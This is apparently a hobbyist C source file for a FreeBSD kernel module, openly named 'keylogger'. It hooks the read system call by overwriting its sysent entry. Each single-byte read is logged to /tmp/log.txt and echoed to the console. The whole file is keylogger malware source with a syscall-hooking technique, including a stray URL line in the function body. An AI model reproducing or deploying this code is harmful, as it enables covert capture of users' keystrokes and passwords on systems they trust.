#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/file.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/ioccom.h>

/**
 * Save user input to a file
 */ 
static int saveinput(struct thread *t, char c){
    // Some magical code
    int error = kern_openat(t, AT_FDCWD, "/tmp/log.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if(error){
        uprintf("open error %d\n", error);
    }

    int buf[1] = {c};
    int file_descripter = t->td_retval[0]; // Not sure about this
    struct iovec aiov;
    struct uio auio;
    // bzero(&auio, sizeof(auio));
    // bzero(&aiov, sizeof(aiov));
    https://stackoverflow.com/questions/27695594/where-is-freebsd-libcs-write-defined
    aiov.iov_base = &buf;
    aiov.iov_len = 1;
    auio.uio_iov = &aiov;
    auio.uio_iovcnt = 1;
    //auio.uio_offset = 0;
    auio.uio_resid = 1;
    auio.uio_segflg = UIO_SYSSPACE;
    auio.uio_rw = UIO_WRITE;
    auio.uio_td = t;
    
    error = kern_writev(t, file_descripter, &auio);
    if (error){
        uprintf("write error %d\n", error);
        return error;
    }

    struct close_args fdtmp;
    fdtmp.fd = file_descripter;
    sys_close(t, &fdtmp);
    return(error);
}
/**
 * Hijacks the read system call
 * Logs all keystrokes from stdin.
 */
static int read_hook(struct thread *t, void *syscall_arg){
    // args: int fd, void *buf, size_t nbyte
    struct read_args *uap;
    uap = (struct read_args *)syscall_arg;

    int error;
    char buff[1024];
    size_t done;

    // Calls the original read to get input
    error = sys_read(t, syscall_arg);
    //if the input is not a keystroke, error out
    if (error || (!uap->nbyte) || (uap->nbyte > 1)){
        return(error);
    }

    // Copys buffer from userland to kernel
    copyinstr(uap->buf, buff, 1, &done);
    printf("%c\n", buff[0]);
    saveinput(t, buff[0]);
    return(error);
}

static int key_handler(struct thread *td, void *arg){
    /* hooking read syscall */
    sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
    return(0);
}

/* Our new system call */
static struct sysent key_sysent = {
    0, /* number of argurment */
    key_handler /* implementing function */
};


static int offset = 217;

static int load(struct module *module, int cmd, void *arg){
    int error = 0;
    switch (cmd){
        case MOD_LOAD:
            /* code */
            uprintf("Module Loaded");
            break;
        case MOD_UNLOAD:
            sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
            uprintf("Module Unloaded");
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(keylogger, &offset, &key_sysent, load, 0);
